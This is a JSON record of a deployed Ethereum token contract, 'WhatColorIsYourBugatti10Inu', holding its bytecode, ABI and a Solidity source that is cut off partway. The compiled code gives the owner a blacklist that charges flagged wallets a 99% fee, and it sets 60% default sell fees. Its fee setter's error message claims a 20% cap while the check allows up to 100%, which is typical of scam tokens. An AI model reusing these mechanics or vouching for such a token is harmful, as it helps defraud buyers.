{
    "address": "0x0571e4201619916DB35214e935F0E46F037BBd2D",
    "tx_hash": "33f97f19b39dae17f8596648b969967bbbd0b320b9c9609758401e05712719e5",
    "block_number": 18009269,
    "timestamp": 1693178891,
    "gas_used_in_creation": 4749379,
    "creation_bytecode": "6080604052620000126009600a620004d2565b620000219062989680620004ea565b60018190556007805461ffff60a01b1916600160a81b1790556004600a55620186a09062000052906103e8620004ea565b6200005e919062000504565b600b55620186a0600154600a620000769190620004ea565b62000082919062000504565b600c556000600d8190556101f4600e819055600f55601055610bb860115561177060128190556013556127106014819055601580547310c2c05a8b9cc5af3239a3df751c53435d90a8966001600160a01b031991821681179092556016805482168317905560178054909116909117905560015462000103906064620004ea565b6200010f919062000504565b6018556127106001546064620001269190620004ea565b62000132919062000504565b6019556127106001546064620001499190620004ea565b62000155919062000504565b601a553480156200016557600080fd5b50600080546001600160a01b031916331781556040805163c45a015560e01b81529051737a250d5630b4cf539739df2c5dacb4c659f2488d9291839163c45a0155916004808201926020929091908290030181865afa158015620001cd573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001f3919062000527565b6001600160a01b031663c9c6539630846001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000241573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000267919062000527565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303816000875af1158015620002b5573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620002db919062000527565b600680546001600160a01b038581166001600160a01b031992831617909255600780548484169216919091179055306000908152600460209081526040808320805460ff19908116600190811790925560175486168552828520805482168317905560165486168552828520805482168317905560155490951684528184208054861682179055338085528285208054909616821790955554600283528184208190559051908152939450919290917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef910160405180910390a3505062000552565b634e487b7160e01b600052601160045260246000fd5b600181815b8085111562000414578160001904821115620003f857620003f8620003bd565b808516156200040657918102915b93841c9390800290620003d8565b509250929050565b6000826200042d57506001620004cc565b816200043c57506000620004cc565b8160018114620004555760028114620004605762000480565b6001915050620004cc565b60ff841115620004745762000474620003bd565b50506001821b620004cc565b5060208310610133831016604e8410600b8410161715620004a5575081810a620004cc565b620004b18383620003d3565b8060001904821115620004c857620004c8620003bd565b0290505b92915050565b6000620004e360ff8416836200041c565b9392505050565b8082028115828204841417620004cc57620004cc620003bd565b6000826200052257634e487b7160e01b600052601260045260246000fd5b500490565b6000602082840312156200053a57600080fd5b81516001600160a01b0381168114620004e357600080fd5b611e8580620005626000396000f3fe6080604052600436106101855760003560e01c80637cca52fe116100d15780639cc353511161008a578063a9059cbb11610064578063a9059cbb146104bc578063cb7f97d7146104dc578063dd62ed3e146104fc578063f2fde38b1461054257600080fd5b80639cc353511461045c5780639d8740cb1461047c578063a8aa1b311461049c57600080fd5b80637cca52fe1461038f5780637d1db4a5146103a5578063893d20e8146103bb5780638cd4426d146103ed5780639213c3581461040d57806395d89b411461042d57600080fd5b80632f54bf6e1161013e57806348ff2b8b1161011857806348ff2b8b1461030e57806351bc3c851461032e57806370a082311461034357806378109e541461037957600080fd5b80632f54bf6e14610293578063313ce567146102c25780633f4218e0146102de57600080fd5b806306fdde0314610191578063095ea7b3146101e957806318160ddd14610219578063229b6a5e1461023c57806323b872dd1461025e578063293230b81461027e57600080fd5b3661018c57005b600080fd5b34801561019d57600080fd5b5060408051808201909152601b81527f57686174436f6c6f724973596f7572427567617474693130496e75000000000060208201525b6040516101e091906119d1565b60405180910390f35b3480156101f557600080fd5b50610209610204366004611a34565b610562565b60405190151581526020016101e0565b34801561022557600080fd5b5061022e610579565b6040519081526020016101e0565b34801561024857600080fd5b5061025c610257366004611a6e565b6105ea565b005b34801561026a57600080fd5b50610209610279366004611af4565b610694565b34801561028a57600080fd5b5061025c6106fe565b34801561029f57600080fd5b506102096102ae366004611b35565b6000546001600160a01b0391821691161490565b3480156102ce57600080fd5b50604051600981526020016101e0565b3480156102ea57600080fd5b506102096102f9366004611b35565b60046020526000908152604090205460ff1681565b34801561031a57600080fd5b5061025c610329366004611b52565b61073d565b34801561033a57600080fd5b5061025c610792565b34801561034f57600080fd5b5061022e61035e366004611b35565b6001600160a01b031660009081526002602052604090205490565b34801561038557600080fd5b5061022e601a5481565b34801561039b57600080fd5b5061022e60195481565b3480156103b157600080fd5b5061022e60185481565b3480156103c757600080fd5b506000546001600160a01b03165b6040516001600160a01b0390911681526020016101e0565b3480156103f957600080fd5b5061025c610408366004611a34565b6107e7565b34801561041957600080fd5b5061025c610428366004611b8b565b61090e565b34801561043957600080fd5b5060408051808201909152600681526509a82a8a492b60d31b60208201526101d3565b34801561046857600080fd5b5061025c610477366004611bcb565b6109b4565b34801561048857600080fd5b5061025c610497366004611bcb565b610ae9565b3480156104a857600080fd5b506007546103d5906001600160a01b031681565b3480156104c857600080fd5b506102096104d7366004611a34565b610b4f565b3480156104e857600080fd5b5061025c6104f7366004611bf7565b610b5c565b34801561050857600080fd5b5061022e610517366004611c43565b6001600160a01b03918216600090815260036020908152604080832093909416825291909152205490565b34801561054e57600080fd5b5061025c61055d366004611b35565b610c53565b600061056f338484610cd1565b5060015b92915050565b60026020527fac33ff75c19e70fe83507db0d683fd3465c996598dc972688b7ace676c89077b5461dead60009081527f6a9609baa168169acaea398c4407efea4be641bb08e21e88806d9836fd9333cc5460015491926105e59290916105df9190610df5565b90610df5565b905090565b6000546001600160a01b0316331461061d5760405162461bcd60e51b815260040161061490611c71565b60405180910390fd5b60005b8281101561068e57816005600086868581811061063f5761063f611c91565b90506020020160208101906106549190611b35565b6001600160a01b031681526020810191909152604001600020805460ff19169115159190911790558061068681611cbd565b915050610620565b50505050565b60006106a1848484610e01565b6106f384336106ee85604051806060016040528060288152602001611e28602891396001600160a01b038a166000908152600360209081526040808320338452909152902054919061134e565b610cd1565b5060015b9392505050565b6000546001600160a01b031633146107285760405162461bcd60e51b815260040161061490611c71565b6007805460ff60a01b1916600160a01b179055565b6000546001600160a01b031633146107675760405162461bcd60e51b815260040161061490611c71565b6001600160a01b03919091166000908152600460205260409020805460ff1916911515919091179055565b6000546001600160a01b031633146107bc5760405162461bcd60e51b815260040161061490611c71565b30600090815260026020526040902054600b548111156107db5750600b545b6107e48161137a565b50565b6000546001600160a01b031633146108115760405162461bcd60e51b815260040161061490611c71565b6040516370a0823160e01b81523060048201526000906108959060649061088f9085906001600160a01b038816906370a0823190602401602060405180830381865afa158015610865573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108899190611cd6565b906114f7565b90611503565b60155460405163a9059cbb60e01b81526001600160a01b0391821660048201526024810183905291925084169063a9059cbb906044016020604051808303816000875af11580156108ea573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061068e9190611cef565b6000546001600160a01b031633146109385760405162461bcd60e51b815260040161061490611c71565b601680546001600160a01b039485166001600160a01b031991821681179092556017805494861694821685179055601580549390951692168217909355600092835260046020526040808420805460ff199081166001908117909255938552818520805485168217905591845290922080549091169091179055565b6000546001600160a01b031633146109de5760405162461bcd60e51b815260040161061490611c71565b60006109fb61271061088f866001546114f790919063ffffffff16565b90506000610a1a61271061088f866001546114f790919063ffffffff16565b90506000610a3961271061088f866001546114f790919063ffffffff16565b60188490556019839055601a81905590506000610a5f6103e861088f6005610889610579565b9050808410158015610a715750808310155b8015610a7d5750808210155b610ae05760405162461bcd60e51b815260206004820152602e60248201527f4d61782054587320616e64204d61782057616c6c65742063616e6e6f7420626560448201526d206c657373207468616e202e352560901b6064820152608401610614565b50505050505050565b6000546001600160a01b03163314610b135760405162461bcd60e51b815260040161061490611c71565b600a839055600154610b2e90620186a09061088f90856114f7565b600b55600154610b4790620186a09061088f90846114f7565b600c55505050565b600061056f338484610e01565b6000546001600160a01b03163314610b865760405162461bcd60e51b815260040161061490611c71565b600d879055600e8690556010859055600f849055601183905560128290556013819055601454610bb7906001611503565b60115411158015610bd75750601454610bd1906001611503565b60125411155b8015610bf25750601454610bec906001611503565b60135411155b610ae05760405162461bcd60e51b815260206004820152602c60248201527f746f74616c46656520616e642073656c6c4665652063616e6e6f74206265206d60448201526b6f7265207468616e2032302560a01b6064820152608401610614565b6000546001600160a01b03163314610c7d5760405162461bcd60e51b815260040161061490611c71565b600080546001600160a01b0319166001600160a01b0383169081179091556040519081527f04dba622d284ed0014ee4b9a6a68386be1a4c08a4913ae272de89199cc6861639060200160405180910390a150565b6001600160a01b038316610d335760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610614565b6001600160a01b038216610d945760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610614565b6001600160a01b0383811660008181526003602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b60006106f78284611d0c565b6001600160a01b038316610e655760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610614565b6001600160a01b038216610ec75760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610614565b6001600160a01b038316600090815260026020526040902054811115610f495760405162461bcd60e51b815260206004820152603160248201527f596f752061726520747279696e6720746f207472616e73666572206d6f7265206044820152707468616e20796f75722062616c616e636560781b6064820152608401610614565b6001600160a01b03831660009081526004602052604090205460ff16158015610f8b57506001600160a01b03821660009081526004602052604090205460ff16155b15610fda57600754600160a01b900460ff16610fda5760405162461bcd60e51b815260206004820152600e60248201526d1d1c98591a5b99d05b1b1bddd95960921b6044820152606401610614565b6001600160a01b03831660009081526004602052604090205460ff1615801561101c57506001600160a01b03821660009081526004602052604090205460ff16155b801561103657506007546001600160a01b03838116911614155b801561104d57506001600160a01b03821661dead14155b156110c657601a546001600160a01b038316600090815260026020526040902054611078908361150f565b11156110c65760405162461bcd60e51b815260206004820152601e60248201527f45786365656473206d6178696d756d2077616c6c657420616d6f756e742e00006044820152606401610614565b6007546001600160a01b03848116911614611167576019548111158061110457506001600160a01b03831660009081526004602052604090205460ff165b8061112757506001600160a01b03821660009081526004602052604090205460ff165b6111675760405162461bcd60e51b8152602060048201526011602482015270151608131a5b5a5d08115e18d959591959607a1b6044820152606401610614565b6018548111158061119057506001600160a01b03831660009081526004602052604090205460ff165b806111b357506001600160a01b03821660009081526004602052604090205460ff165b6111f35760405162461bcd60e51b8152602060048201526011602482015270151608131a5b5a5d08115e18d959591959607a1b6044820152606401610614565b6007546001600160a01b03838116911614801561122957506001600160a01b03831660009081526004602052604090205460ff16155b15611247576001600860008282546112419190611d1f565b90915550505b61125283838361151b565b1561126857611262600b5461137a565b60006008555b6001600160a01b03831660009081526002602052604090205461128b9082610df5565b6001600160a01b0384166000908152600260205260408120919091556112b184846115d5565b6112bb57816112c6565b6112c684848461161b565b6001600160a01b0384166000908152600260205260409020549091506112ec908261150f565b6001600160a01b0380851660008181526002602052604090819020939093559151908616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906113409085815260200190565b60405180910390a350505050565b600081848411156113725760405162461bcd60e51b815260040161061491906119d1565b505050900390565b6009805460ff19166001908117909155600f54600e54600d546000936113b4936002936108899391926113ae92839161150f565b9061150f565b905060006113d18261088f600d54866114f790919063ffffffff16565b905060006113df8483610df5565b9050476113eb82611722565b60006113f74783610df5565b9050600061141a611413600d5488610df590919063ffffffff16565b8390611503565b90506000611433600d54836114f790919063ffffffff16565b9050801561144557611445868261187c565b600e5460009061145a906108898560026114f7565b9050801561149e576016546040516001600160a01b039091169082156108fc029083906000818181858888f1935050505015801561149c573d6000803e3d6000fd5b505b4780156114e1576015546040516001600160a01b039091169082156108fc029083906000818181858888f193505050501580156114df573d6000803e3d6000fd5b505b50506009805460ff191690555050505050505050565b60006106f78284611d32565b60006106f78284611d49565b60006106f78284611d1f565b600c54600b543060009081526002602052604081205460095491938510159211159060ff161580156115565750600754600160a81b900460ff165b801561156b5750600754600160a01b900460ff165b80156115745750815b801561159957506001600160a01b03861660009081526004602052604090205460ff16155b80156115b257506007546001600160a01b038681169116145b80156115c25750600a5460085410155b80156115cb5750805b9695505050505050565b6001600160a01b03821660009081526004602052604081205460ff161580156106f75750506001600160a01b031660009081526004602052604090205460ff1615919050565b6000806116288585611930565b111561171b57600061164b61163d8686611930565b601454610889908690611503565b30600090815260026020526040902054909150611668908261150f565b30600081815260026020526040908190209290925590516001600160a01b038716907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906116b99085815260200190565b60405180910390a360006010541180156116dd57506010546116db8686611930565b115b15611709576117093061dead6117046010546108896014548961150390919063ffffffff16565b610e01565b6117138382610df5565b9150506106f7565b5092915050565b604080516002808252606082018352600092602083019080368337019050509050308160008151811061175757611757611c91565b6001600160a01b03928316602091820292909201810191909152600654604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa1580156117b0573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906117d49190611d6b565b816001815181106117e7576117e7611c91565b6001600160a01b03928316602091820292909201015260065461180d9130911684610cd1565b60065460405163791ac94760e01b81526001600160a01b039091169063791ac94790611846908590600090869030904290600401611d88565b600060405180830381600087803b15801561186057600080fd5b505af1158015611874573d6000803e3d6000fd5b505050505050565b6006546118949030906001600160a01b031684610cd1565b60065460175460405163f305d71960e01b81523060048201526024810185905260006044820181905260648201526001600160a01b0391821660848201524260a482015291169063f305d71990839060c40160606040518083038185885af1158015611904573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906119299190611df9565b5050505050565b6001600160a01b03821660009081526005602052604081205460ff168061196f57506001600160a01b03821660009081526005602052604090205460ff165b1561198957601454611982906064610df5565b9050610573565b6007546001600160a01b03908116908316036119a85750601254610573565b6007546001600160a01b03908116908416036119c75750601154610573565b5060135492915050565b600060208083528351808285015260005b818110156119fe578581018301518582016040015282016119e2565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b03811681146107e457600080fd5b60008060408385031215611a4757600080fd5b8235611a5281611a1f565b946020939093013593505050565b80151581146107e457600080fd5b600080600060408486031215611a8357600080fd5b833567ffffffffffffffff80821115611a9b57600080fd5b818601915086601f830112611aaf57600080fd5b813581811115611abe57600080fd5b8760208260051b8501011115611ad357600080fd5b60209283019550935050840135611ae981611a60565b809150509250925092565b600080600060608486031215611b0957600080fd5b8335611b1481611a1f565b92506020840135611b2481611a1f565b929592945050506040919091013590565b600060208284031215611b4757600080fd5b81356106f781611a1f565b60008060408385031215611b6557600080fd5b8235611b7081611a1f565b91506020830135611b8081611a60565b809150509250929050565b600080600060608486031215611ba057600080fd5b8335611bab81611a1f565b92506020840135611bbb81611a1f565b91506040840135611ae981611a1f565b600080600060608486031215611be057600080fd5b505081359360208301359350604090920135919050565b600080600080600080600060e0888a031215611c1257600080fd5b505085359760208701359750604087013596606081013596506080810135955060a0810135945060c0013592509050565b60008060408385031215611c5657600080fd5b8235611c6181611a1f565b91506020830135611b8081611a1f565b60208082526006908201526510a7aba722a960d11b604082015260600190565b634e487b7160e01b600052603260045260246000fd5b634e487b7160e01b600052601160045260246000fd5b600060018201611ccf57611ccf611ca7565b5060010190565b600060208284031215611ce857600080fd5b5051919050565b600060208284031215611d0157600080fd5b81516106f781611a60565b8181038181111561057357610573611ca7565b8082018082111561057357610573611ca7565b808202811582820484141761057357610573611ca7565b600082611d6657634e487b7160e01b600052601260045260246000fd5b500490565b600060208284031215611d7d57600080fd5b81516106f781611a1f565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015611dd85784516001600160a01b031683529383019391830191600101611db3565b50506001600160a01b03969096166060850152505050608001529392505050565b600080600060608486031215611e0e57600080fd5b835192506020840151915060408401519050925092509256fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220609db3838a6ede8ddc43ff54e2872254e80202a9164dfe9d2ea503779a5bec0264736f6c63430008130033",
    "runtime_bytecode": "",
    "contract_name": "WhatColorIsYourBugatti10Inu",
    "compiler_version": "v0.8.19+commit.7dd6d404",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFeeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"name\":\"rescueERC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_swapAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_swapThreshold\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minTokenAmount\",\"type\":\"uint256\"}],\"name\":\"setContractSwapSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_marketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_liquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_development\",\"type\":\"address\"}],\"name\":\"setInternalAddresses\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_wallet\",\"type\":\"uint256\"}],\"name\":\"setTransactionLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_total\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_trans\",\"type\":\"uint256\"}],\"name\":\"setTransactionRequirements\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setisBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setisExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/**\r\nhttps://t.me/WhatColorIsYourBugatti10Inu\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.19;\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);}\r\n\r\nabstract contract Ownable {\r\n    address internal owner;\r\n    constructor(address _owner) {owner = _owner;}\r\n    modifier onlyOwner() {require(isOwner(msg.sender), \"!OWNER\"); _;}\r\n    function isOwner(address account) public view returns (bool) {return account == owner;}\r\n    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IFactory{\r\n        function createPair(address tokenA, address tokenB) external returns (address pair);\r\n        function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline) external;\r\n}\r\n\r\ncontract WhatColorIsYourBugatti10Inu is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    string private constant _name = 'WhatColorIsYourBugatti10Inu';\r\n    string private constant _symbol = 'MATRIX';\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private _totalSupply = 10000000 * (10 ** _decimals);\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public isFeeExempt;\r\n    mapping (address => bool) private isBot;\r\n    IRouter router;\r\n    address public pair;\r\n    bool private tradingAllowed = false;\r\n    bool private swapEnabled = true;\r\n    uint256 private swapTimes;\r\n    bool private swapping;\r\n    uint256 swapAmount = 4;\r\n    uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;\r\n    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;\r\n    modifier lockTheSwap {swapping = true; _; swapping = false;}\r\n    uint256 private liquidityFee = 0;\r\n    uint256 private marketingFee = 500;\r\n    uint256 private developmentFee = 500;\r\n    uint256 private burnFee = 0;\r\n    uint256 private totalFee = 3000;\r\n    uint256 private sellFee = 6000;\r\n    uint256 private transferFee = 6000;\r\n    uint256 private denominator = 10000;\r\n    address internal constant DEAD = 